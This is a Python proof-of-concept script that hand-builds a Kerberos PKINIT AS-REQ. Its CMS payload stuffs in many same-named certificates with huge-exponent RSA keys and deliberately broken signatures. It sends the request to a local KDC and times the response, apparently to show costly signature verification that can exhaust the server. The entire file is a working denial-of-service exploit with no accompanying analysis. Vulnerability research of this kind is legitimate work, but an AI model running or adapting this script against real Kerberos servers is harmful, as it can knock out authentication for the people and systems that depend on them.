#!/usr/bin/env python3
"""One AS-REQ whose CMS carries many same-named certs. Prints seconds and the KRB-ERROR text."""
import os
import socket
import subprocess
import sys
import time


def derlen(n):
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def tlv(tag, body):
    return bytes([tag]) + derlen(len(body)) + body


def take(buf):
    tag = buf[0]
    n, i = buf[1], 2
    if n & 0x80:
        ln = n & 0x7F
        n = int.from_bytes(buf[i : i + ln], "big")
        i += ln
    return tag, buf[i : i + n], buf[i + n :]


def oid(body):
    return tlv(0x06, body)


def ctx(n, inner):
    return tlv(0xA0 | n, inner)


def gstr(s):
    return tlv(0x1B, s.encode())


def principal(parts):
    ns = tlv(0x30, b"".join(gstr(p) for p in parts))
    return tlv(0x30, ctx(0, tlv(0x02, b"\x01")) + ctx(1, ns))


def issuer_serial(cert):
    _, body, _ = take(cert)
    _, tbs, _ = take(body)
    cur = tbs
    if cur[:1] == b"\xa0":
        _, _, cur = take(cur)
    _, serial, cur = take(cur)
    _, _, cur = take(cur)
    issuer, _ = take_full(cur)
    return issuer, serial


def make_certs(n, outdir):
    os.makedirs(outdir, exist_ok=True)
    key = os.path.join(outdir, "big.pem")
    e = "0x" + ("ff" * 370) + "01"
    subprocess.check_call(
        [
            "openssl",
            "genpkey",
            "-algorithm",
            "RSA",
            "-pkeyopt",
            "rsa_keygen_bits:3072",
            "-pkeyopt",
            f"rsa_keygen_pubexp:{e}",
            "-out",
            key,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    certs = []
    for i in range(1, n + 1):
        der = subprocess.check_output(
            [
                "openssl",
                "req",
                "-new",
                "-x509",
                "-key",
                key,
                "-subj",
                "/CN=Same",
                "-set_serial",
                str(i),
                "-days",
                "30",
                "-outform",
                "DER",
            ]
        )
        certs.append(break_sig(der))
    return certs


def break_sig(cert):
    """Keep the key; replace the signature so a verify runs and fails."""
    _, body, _ = take(cert)
    tbs, rest = take_full(body)
    alg, sig = take_full(rest)
    tag, payload, _ = take(sig)
    payload = b"\x00" + b"\x00" * (len(payload) - 2) + b"\x01"
    return tlv(0x30, tbs + alg + tlv(tag, payload))


def take_full(buf):
    _, _, rest = take(buf)
    return buf[: len(buf) - len(rest)], rest


def cms(certs):
    sha = oid(bytes.fromhex("608648016503040201"))
    sha_alg = tlv(0x30, sha + tlv(0x05, b""))
    sig_alg = tlv(0x30, oid(bytes.fromhex("2a864886f70d01010b")) + tlv(0x05, b""))
    econt = ctx(0, tlv(0x04, b"\x30\x00"))
    encap = tlv(0x30, oid(bytes.fromhex("2a864886f70d010701")) + econt)
    issuer, serial = issuer_serial(certs[0])
    ias = tlv(0x30, issuer + tlv(0x02, serial))
    signer = tlv(
        0x30,
        tlv(0x02, b"\x01") + ias + sha_alg + sig_alg + tlv(0x04, b"\x00"),
    )
    sd = tlv(
        0x30,
        tlv(0x02, b"\x03")
        + tlv(0x31, sha_alg)
        + encap
        + tlv(0xA0, b"".join(certs))
        + tlv(0x31, signer),
    )
    return tlv(0x30, oid(bytes.fromhex("2a864886f70d010702")) + ctx(0, sd))


def krb_error(buf):
    if buf[:1] == b"\x7e":
        _, buf, _ = take(buf)
    if buf[:1] == b"\x30":
        _, buf, _ = take(buf)
    text, code = "", None
    while buf:
        tag, val, buf = take(buf)
        if tag == 0xA6:
            _, raw, _ = take(val)
            code = int.from_bytes(raw, "big", signed=True)
        if tag == 0xAB:
            _, raw, _ = take(val)
            text = raw.decode("latin1", "replace")
    return code, text


def send(port, req):
    s = socket.create_connection(("127.0.0.1", port), 120)
    s.settimeout(120)
    s.sendall(len(req).to_bytes(4, "big") + req)
    hdr = s.recv(4)
    n = int.from_bytes(hdr, "big")
    got = b""
    while len(got) < n:
        chunk = s.recv(n - len(got))
        if not chunk:
            break
        got += chunk
    s.close()
    return got


def pk_as_req(signed):
    return tlv(0x30, bytes([0x80]) + derlen(len(signed)) + signed)


def as_req(signed):
    pa = tlv(
        0x30,
        ctx(1, tlv(0x02, bytes([16]))) + ctx(2, tlv(0x04, pk_as_req(signed))),
    )
    body = b"".join(
        [
            ctx(0, tlv(0x03, b"\x00" + b"\x00" * 4)),
            ctx(1, principal(["user"])),
            ctx(2, gstr("KERBER.TEST")),
            ctx(3, principal(["krbtgt", "KERBER.TEST"])),
            ctx(5, tlv(0x18, b"20300101000000Z")),
            ctx(7, tlv(0x02, b"\x01")),
            ctx(8, tlv(0x30, tlv(0x02, bytes([18])))),
        ]
    )
    fields = b"".join(
        [
            ctx(1, tlv(0x02, b"\x05")),
            ctx(2, tlv(0x02, bytes([10]))),
            ctx(3, tlv(0x30, pa)),
            ctx(4, tlv(0x30, body)),
        ]
    )
    return tlv(0x6A, tlv(0x30, fields))


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 40
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8888
    certs = make_certs(n, "/tmp/mc")
    req = as_req(cms(certs))
    t0 = time.monotonic()
    rep = send(port, req)
    dt = time.monotonic() - t0
    code, text = krb_error(rep)
    print(f"seconds={dt:.2f} code={code} bytes={len(req)}")
    print(text)


if __name__ == "__main__":
    main()
